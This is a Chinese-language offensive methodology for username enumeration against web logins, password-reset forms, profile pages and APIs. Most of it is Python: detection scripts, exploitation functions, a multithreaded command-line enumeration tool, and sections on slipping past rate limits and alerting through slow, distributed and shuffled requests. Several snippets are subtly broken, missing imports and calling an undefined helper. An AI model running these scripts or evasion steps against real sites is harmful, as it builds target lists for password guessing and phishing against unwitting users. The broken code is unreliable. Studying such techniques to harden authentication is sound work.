# 用户名枚举攻击方法论

## 1. 技术概述

### 1.1 漏洞原理
用户名枚举攻击发生在以下场景：
- **差异化错误消息**：系统对"用户不存在"和"密码错误"返回不同消息
- **响应时间差异**：有效用户和无效用户的响应时间不同（如 bcrypt 验证耗时）
- **存在性检查接口**：API 直接暴露用户存在性检查功能
- **密码重置功能**：密码重置流程泄露用户存在性

**本质**：攻击者通过系统响应的差异判断用户名是否有效，为后续攻击建立目标列表。

### 1.2 攻击影响
- **信息收集**：建立有效用户名列表用于后续攻击
- **精准攻击**：针对有效用户进行密码暴力破解
- **社会工程**：结合用户名信息进行钓鱼攻击
- **隐私泄露**：暴露系统用户信息

### 1.3 枚举技术分类

| 类型 | 描述 | 检测难度 |
|-----|------|---------|
| **错误消息枚举** | 基于不同错误消息判断 | 容易检测 |
| **时序枚举** | 基于响应时间差异判断 | 难以检测 |
| **URL 枚举** | 基于用户页面存在性判断 | 容易检测 |
| **API 枚举** | 基于 API 响应判断 | 中等难度 |
| **密码重置枚举** | 基于重置流程响应判断 | 中等难度 |

---

## 2. 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **登录接口** | POST /login | 返回"用户不存在"vs"密码错误" |
| **密码重置** | POST /forgot-password | 显示"用户不存在"或"邮件已发送" |
| **用户注册** | POST /register | 提示"用户名已存在" |
| **用户资料页** | GET /user/{username} | 404 vs 200 响应 |
| **API 用户查询** | GET /api/users/{id} | 返回用户信息或 404 |
| **评论/留言** | 显示作者信息 | 暴露有效用户名 |
| **团队成员页面** | 展示团队成员 | 暴露员工账户名 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 错误消息枚举检测
```python
import requests
import statistics

def test_error_message_enumeration(login_url):
    """测试登录接口是否存在错误消息枚举"""
    
    # 测试已知不存在的用户
    invalid_response = requests.post(login_url, data={
        "username": "definitely_not_exist_user_xyz123",
        "password": "wrongpassword"
    })
    
    # 测试可能存在的用户
    test_usernames = ["admin", "root", "user", "test", "demo"]
    
    for username in test_usernames:
        response = requests.post(login_url, data={
            "username": username,
            "password": "wrongpassword"
        })
        
        # 比较响应内容
        if response.text != invalid_response.text:
            # 检查是否有差异化消息
            if "not found" in invalid_response.text.lower() and \
               "incorrect" in response.text.lower():
                print(f"✓ User '{username}' may exist (different error message)")
            elif response.status_code != invalid_response.status_code:
                print(f"✓ User '{username}' may exist (different status code)")
            else:
                # 详细比较差异
                import difflib
                diff = difflib.ndiff(
                    invalid_response.text.splitlines(),
                    response.text.splitlines()
                )
                differences = [line for line in diff if line.startswith('+ ') or line.startswith('- ')]
                if len(differences) > 10:  # 显著差异
                    print(f"? User '{username}' - response differs ({len(differences)} lines)")
```

#### 3.1.2 时序枚举检测
```python
def test_timing_enumeration(login_url, iterations=10):
    """
    测试登录接口是否存在时序枚举漏洞
    有效用户通常需要更多时间（密码哈希验证）
    """
    
    # 测试无效用户（应快速返回）
    invalid_times = []
    for _ in range(iterations):
        start = time.time()
        requests.post(login_url, data={
            "username": "invalid_user_xyz",
            "password": "wrongpassword"
        })
        invalid_times.append(time.time() - start)
    
    # 测试可能有效的用户
    test_usernames = ["admin", "root", "demo"]
    
    for username in test_usernames:
        valid_times = []
        
        for _ in range(iterations):
            start = time.time()
            requests.post(login_url, data={
                "username": username,
                "password": "wrongpassword"
            })
            valid_times.append(time.time() - start)
        
        # 统计分析
        invalid_avg = statistics.mean(invalid_times) * 1000  # 转换为 ms
        valid_avg = statistics.mean(valid_times) * 1000
        invalid_std = statistics.stdev(invalid_times) * 1000
        valid_std = statistics.stdev(valid_times) * 1000
        
        # 计算差异
        diff = valid_avg - invalid_avg
        threshold = 50  # 50ms 差异阈值
        
        print(f"\nUser: {username}")
        print(f"  Invalid avg: {invalid_avg:.2f}ms (±{invalid_std:.2f}ms)")
        print(f"  Valid avg:   {valid_avg:.2f}ms (±{valid_std:.2f}ms)")
        print(f"  Difference:  {diff:.2f}ms")
        
        if diff > threshold:
            print(f"  ✓ LIKELY EXISTS (significant timing difference)")
        elif diff < -threshold:
            print(f"  ? ANOMALY (negative timing difference)")
        else:
            print(f"  ✗ No significant timing difference")
```

#### 3.1.3 密码重置枚举
```python
def test_password_reset_enumeration(reset_url):
    """测试密码重置功能是否泄露用户存在性"""
    
    # 测试不存在的用户
    invalid_response = requests.post(reset_url, data={
        "email": "definitely_not_exist_xyz@example.com"
    })
    
    # 测试可能存在的用户
    test_emails = [
        "admin@example.com",
        "test@example.com",
        "user@example.com"
    ]
    
    for email in test_emails:
        response = requests.post(reset_url, data={
            "email": email
        })
        
        # 检查响应差异
        if "sent" in response.text.lower() and \
           "not found" not in invalid_response.text.lower():
            print(f"✓ Email '{email}' may exist (reset email sent)")
        elif response.text == invalid_response.text:
            # 安全实现：总是显示相同消息
            print(f"? Email '{email}' - no information leaked (good)")
        else:
            print(f"? Email '{email}' - response differs, needs manual review")
```

#### 3.1.4 用户资料页枚举
```python
def test_profile_page_enumeration(base_url):
    """测试用户资料页是否暴露用户存在性"""
    
    # 测试不存在的用户
    invalid_response = requests.get(f"{base_url}/user/invalid_xyz_123")
    
    # 常见用户名列表
    common_usernames = ["admin", "root", "user", "test", "guest"]
    
    for username in common_usernames:
        response = requests.get(f"{base_url}/user/{username}")
        
        # 404 表示用户不存在
        if response.status_code == 404:
            print(f"✗ User '{username}' does not exist (404)")
        elif response.status_code == 200:
            print(f"✓ User '{username}' exists (200)")
            
            # 提取用户信息
            import re
            emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', response.text)
            if emails:
                print(f"   Found email: {emails[0]}")
        elif response.status_code == 302:
            # 重定向可能表示用户存在但需要认证
            print(f"? User '{username}' may exist (redirect)")
```

### 3.2 白盒测试

#### 3.2.1 源代码审计
```bash
# 搜索差异化错误消息
grep -rn "user.*not.*found\|invalid.*user\|incorrect.*password" --include="*.py"

# 搜索时序差异点（bcrypt 验证）
grep -rn "bcrypt\|verify_password\|check_password" --include="*.py"

# 搜索用户存在性检查
grep -rn "user.*exist\|username.*taken" --include="*.py"
```

#### 3.2.2 认证逻辑分析
```python
def analyze_auth_logic(source_file):
    """分析认证逻辑中的枚举漏洞"""
    
    with open(source_file, 'r') as f:
        code = f.read()
    
    # 检查认证流程
    import re
    
    # 查找认证函数
    auth_functions = re.findall(
        r'def\s+(authenticate|login|verify).*?:\s*.*?(?=\ndef|\Z)',
        code, re.DOTALL
    )
    
    for func in auth_functions:
        print(f"\n=== Analyzing: {func[:100]}...")
        
        # 检查错误消息
        if "not found" in func and "incorrect" in func:
            print("⚠ Different error messages for invalid user vs wrong password")
        
        # 检查时序差异
        if "bcrypt" in func or "verify_password" in func:
            print("⚠ Password verification may cause timing difference")
        
        # 检查早期返回
        early_returns = re.findall(r'if\s+not\s+user:.*?return', func, re.DOTALL)
        if early_returns:
            print("⚠ Early return for invalid user may cause timing leak")
```

---

## 4. 漏洞利用方法

### 4.1 基础信息收集

#### 4.1.1 构建用户名列表
```python
def build_username_wordlist(target_domain):
    """基于目标域名构建用户名列表"""
    
    usernames = []
    
    # 常见用户名模式
    patterns = [
        "admin", "administrator", "root", "system",
        "user", "test", "guest", "demo",
        "info", "contact", "support", "sales",
        "webmaster", "postmaster", "hostmaster"
    ]
    
    # 基于域名的用户名
    if target_domain:
        company = target_domain.split('.')[0]
        patterns.extend([
            company,
            f"admin@{target_domain}",
            f"info@{target_domain}"
        ])
    
    # 姓名组合
    first_names = ["john", "jane", "michael", "sarah", "david"]
    last_names = ["smith", "johnson", "williams", "brown", "jones"]
    
    for first in first_names:
        for last in last_names:
            patterns.extend([
                f"{first}{last}",
                f"{first}.{last}",
                f"{first[0]}{last}",
                f"{first}{last[0]}",
                f"{first}_{last}"
            ])
    
    return patterns
```

#### 4.1.2 识别枚举向量
```python
def identify_enumeration_vectors(base_url):
    """识别所有可能的用户名枚举向量"""
    
    vectors = []
    
    # 测试登录接口
    login_response = requests.get(f"{base_url}/login")
    if login_response.status_code == 200:
        vectors.append("login_form")
        print("✓ Login form available")
    
    # 测试密码重置
    reset_paths = ["/forgot-password", "/reset-password", "/password-reset"]
    for path in reset_paths:
        response = requests.get(f"{base_url}{path}")
        if response.status_code == 200:
            vectors.append(f"password_reset ({path})")
            print(f"✓ Password reset available at {path}")
    
    # 测试用户资料页
    test_response = requests.get(f"{base_url}/user/test")
    if test_response.status_code in [200, 404]:
        vectors.append("user_profile_pages")
        print("✓ User profile pages available")
    
    # 测试 API 端点
    api_response = requests.get(f"{base_url}/api/users/admin")
    if api_response.status_code in [200, 404]:
        vectors.append("api_user_lookup")
        print("✓ API user lookup available")
    
    return vectors
```

### 4.2 自动化枚举

#### 4.2.1 登录接口枚举
```python
def enumerate_via_login(login_url, username_list, method="timing"):
    """
    通过登录接口枚举用户名
    
    method: "timing" | "message" | "both"
    """
    
    valid_users = []
    
    # 基线：无效用户的响应
    baseline_response = requests.post(login_url, data={
        "username": "invalid_xyz_not_exist",
        "password": "baseline"
    })
    
    for username in username_list:
        if method in ["timing", "both"]:
            # 时序分析
            times = []
            for _ in range(5):
                start = time.time()
                requests.post(login_url, data={
                    "username": username,
                    "password": "timing_test"
                })
                times.append(time.time() - start)
            
            avg_time = statistics.mean(times) * 1000
            
            # 与基线比较
            baseline_times = []
            for _ in range(5):
                start = time.time()
                requests.post(login_url, data={
                    "username": "invalid_xyz_not_exist",
                    "password": "baseline"
                })
                baseline_times.append(time.time() - start)
            
            baseline_avg = statistics.mean(baseline_times) * 1000
            
            if avg_time - baseline_avg > 50:  # 50ms 阈值
                print(f"✓ {username} (timing: +{avg_time - baseline_avg:.0f}ms)")
                valid_users.append(username)
                continue
        
        if method in ["message", "both"]:
            # 消息分析
            response = requests.post(login_url, data={
                "username": username,
                "password": "wrongpassword"
            })
            
            # 检查差异化消息
            if response.text != baseline_response.text:
                if "incorrect" in response.text.lower() and \
                   "not found" in baseline_response.text.lower():
                    print(f"✓ {username} (message)")
                    valid_users.append(username)
    
    return valid_users
```

#### 4.2.2 密码重置枚举
```python
def enumerate_via_password_reset(reset_url, email_list):
    """通过密码重置功能枚举邮箱"""
    
    valid_emails = []
    
    # 基线响应
    baseline_response = requests.post(reset_url, data={
        "email": "invalid_xyz_not_exist@example.com"
    })
    
    for email in email_list:
        response = requests.post(reset_url, data={
            "email": email
        })
        
        # 检测成功响应
        if "sent" in response.text.lower() or "check your email" in response.text.lower():
            if "sent" not in baseline_response.text.lower():
                print(f"✓ {email} (reset email sent)")
                valid_emails.append(email)
                continue
        
        # 检测速率限制
        if "too many" in response.text.lower() or "try again later" in response.text.lower():
            print(f"⚠ Rate limited, waiting...")
            time.sleep(60)
            continue
    
    return valid_emails
```

#### 4.2.3 批量枚举脚本
```python
#!/usr/bin/env python3
"""
Username Enumeration Automation Script
"""

import requests
import statistics
import time
import argparse
from concurrent.futures import ThreadPoolExecutor

class UsernameEnumerator:
    def __init__(self, base_url, threads=5):
        self.base_url = base_url
        self.threads = threads
        self.session = requests.Session()
        self.valid_users = []
        self.lock = threading.Lock()
    
    def test_login_timing(self, username):
        """测试登录时序"""
        times = []
        for _ in range(5):
            start = time.time()
            try:
                self.session.post(f"{self.base_url}/login", data={
                    "username": username,
                    "password": "test"
                }, timeout=10)
            except:
                pass
            times.append(time.time() - start)
        return statistics.mean(times) * 1000
    
    def enumerate_batch(self, usernames):
        """批量枚举"""
        
        def process_user(username):
            avg_time = self.test_login_timing(username)
            
            # 与基线比较（假设基线 ~10ms）
            if avg_time > 60:  # 显著高于基线
                with self.lock:
                    self.valid_users.append(username)
                    print(f"✓ {username} ({avg_time:.0f}ms)")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(process_user, usernames)
        
        return self.valid_users

def main():
    parser = argparse.ArgumentParser(description='Username Enumeration Tool')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-u', '--userlist', required=True, help='Username list file')
    parser.add_argument('-o', '--output', help='Output file for valid users')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    
    args = parser.parse_args()
    
    # 加载用户名列表
    with open(args.userlist, 'r') as f:
        usernames = [line.strip() for line in f]
    
    print(f"[*] Loaded {len(usernames)} usernames")
    print(f"[*] Target: {args.target}")
    print(f"[*] Threads: {args.threads}")
    
    # 执行枚举
    enumerator = UsernameEnumerator(args.target, args.threads)
    valid = enumerator.enumerate_batch(usernames)
    
    print(f"\n[*] Enumeration complete")
    print(f"[+] Found {len(valid)} valid usernames")
    
    # 保存结果
    if args.output:
        with open(args.output, 'w') as f:
            for user in valid:
                f.write(f"{user}\n")
        print(f"[+] Results saved to {args.output}")

if __name__ == "__main__":
    main()
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过速率限制

#### 5.1.1 分布式枚举
```python
def distributed_enumeration(targets, username_list, delay_per_request=1):
    """
    在多个相关目标上分布式枚举，避免触发单一目标的速率限制
    """
    
    all_valid_users = {}
    
    for target in targets:
        valid = enumerate_via_login(f"{target}/login", username_list)
        all_valid_users[target] = valid
        
        # 每个目标之间延迟
        time.sleep(delay_per_request * len(username_list))
    
    # 汇总结果
    common_users = set.intersection(*[set(users) for users in all_valid_users.values()])
    print(f"\nCommon users across all targets: {common_users}")
    
    return all_valid_users
```

### 5.2 绕过检测

#### 5.2.1 低频枚举
```python
def low_frequency_enumeration(login_url, username_list, requests_per_hour=60):
    """
    低频枚举：每小时仅发送少量请求，避免触发告警
    """
    
    delay_between_requests = 3600 / requests_per_hour  # 秒
    valid_users = []
    
    print(f"[*] Starting low-frequency enumeration")
    print(f"[*] Rate: {requests_per_hour} requests/hour")
    print(f"[*] Delay between requests: {delay_between_requests:.0f}s")
    
    for username in username_list:
        result = test_single_user(login_url, username)
        
        if result['valid']:
            valid_users.append(username)
            print(f"✓ {username}")
        
        # 应用延迟
        time.sleep(delay_between_requests)
    
    return valid_users
```

### 5.3 统计增强

#### 5.3.1 多轮时序分析
```python
def multi_round_timing_analysis(login_url, username_list, rounds=3):
    """
    多轮时序分析提高准确性
    """
    
    user_scores = {user: 0 for user in username_list}
    
    for round_num in range(rounds):
        print(f"\n[*] Round {round_num + 1}/{rounds}")
        
        # 打乱顺序避免模式检测
        random.shuffle(username_list)
        
        for username in username_list:
            times = []
            for _ in range(10):  # 每轮 10 次测量
                start = time.time()
                requests.post(login_url, data={
                    "username": username,
                    "password": "test"
                })
                times.append(time.time() - start)
            
            avg_time = statistics.mean(times) * 1000
            
            # 评分
            if avg_time > 100:
                user_scores[username] += 2
            elif avg_time > 50:
                user_scores[username] += 1
    
    # 输出高分用户
    threshold = rounds  # 至少在一轮中得 2 分或在两轮中得 1 分
    likely_valid = [user for user, score in user_scores.items() if score >= threshold]
    
    print(f"\nLikely valid users: {likely_valid}")
    return likely_valid
```

---

## 6. 常用 Payload 速查表

### 6.1 常见用户名列表

| 用户名 | 常见场景 |
|-------|---------|
| admin | 管理账户 |
| root | 系统管理员 |
| test | 测试账户 |
| demo | 演示账户 |
| user | 普通用户 |
| guest | 访客账户 |
| info | 信息账户 |
| support | 支持账户 |
| sales | 销售账户 |
| contact | 联系账户 |

### 6.2 时序分析阈值

| 差异 | 可能性 |
|-----|-------|
| >100ms | 很可能存在 |
| 50-100ms | 可能存在 |
| <50ms | 无显著差异 |

---

## 7. 参考资源

- [OWASP Username Enumeration Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Username_Enumeration_Prevention_Cheat_Sheet.html)
- [PortSwigger - Username Enumeration](https://portswigger.net/web-security/authentication/password-based/username-enumeration)
- [CWE-200: Information Exposure](https://cwe.mitre.org/data/definitions/200.html)
